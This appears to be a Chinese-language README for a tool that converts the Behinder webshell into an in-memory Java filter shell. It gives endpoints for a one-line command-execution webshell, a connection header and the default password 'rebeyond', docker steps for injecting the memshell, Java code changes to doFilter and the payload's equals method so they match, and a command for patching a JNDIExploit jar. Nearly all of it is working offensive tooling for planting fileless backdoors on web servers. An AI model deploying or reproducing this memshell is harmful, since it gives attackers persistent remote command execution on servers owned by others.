# BehinderMemShell
研究將冰蠍修改為內存馬方式執行。

* Check MemShell
  * XXXXX?type=check
* 一句話木馬
  * XXXXX?type=basic&pass=[cmd]
* 冰蠍
  * 任意路徑
  * Header中加入 `X-Options-Ai: XXXXX`
  * 密碼 rebeyond

# Update
* 2022/06/11
  * 支援 SpringMemshell 的冰蠍功能

# Demo
* docker build -t memshell . --no-cache
* docker run -it memshell
* 訪問 http://172.17.0.2:8080/inject.jsp 觸發注入 MemShell
* 訪問 http://172.17.0.2:8080/inject.jsp?type=basic&pass=id 檢查是否執行網馬
* 用冰蠍連接 MemShell

# 解析

冰蠍的運作原理是將 Payload 中的 Class 透過 ClassLoader 的 defineClass 函式，將 Bytes 還原回 Class，Payload 的 Class 入口函式是 equals，內容如下：
```
public boolean equals(Object obj) {
	PageContext page = (PageContext)obj;
	this.Session = page.getSession();
	this.Response = page.getResponse();
	this.Request = page.getRequest();
	...
}
```

obj 進入 equals 後會被轉換為 PageContext，進而獲取 Request、Response 及 Session，doFilter 函式中可以獲取 Request、Response，Session 則可以透過 Request 獲得，修改後的 MemShell 程式如下：
```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
	...
	HashMap<Object, Object> pageContext = new HashMap<>();
	pageContext.put("request", servletRequest);
	pageContext.put("response", servletResponse);
	pageContext.put("session", ((HttpServletRequest)servletRequest).getSession());
	...
	Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[] { HashMap.class });
	targetMethod.invoke(evilClass.newInstance(), new Object[] { pageContext });
	...
}
```

因冰蠍接收端生成 Payload 的 Class入口函示仍為 equals(Object obj)，而非我們修改過的 equals(HashMap obj)，所以會在 invoke 時產生錯誤，所以接收端也需要進行修改，冰蠍3.0後的版本在 net.rebeyond.behinder.payload.java 下的程式皆須修改，將 equals 函式修改如下：
```
public boolean equals(HashMap obj) {
	this.Session = (HttpSession)obj.get("session");
	this.Response = (ServletResponse)obj.get("response");
	this.Request = (ServletRequest)obj.get("request");
	...
}
```

# Some Notes
* 更新 jar 包中的 class
  * `jar -uvf JNDIExploit.jar com\feihong\ldap\template\DynamicFilterTemplate.class`

# Reference
* [JNDIExploit](https://github.com/Jeromeyoung/JNDIExploit-1)
* [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ)
* [利用shiro反序列化注入冰蝎内存马](https://xz.aliyun.com/t/10696)
* [告别脚本小子系列丨JAVA安全(4)——ClassLoader机制与冰蝎Webshell分析](https://www.freebuf.com/articles/network/323994.html)
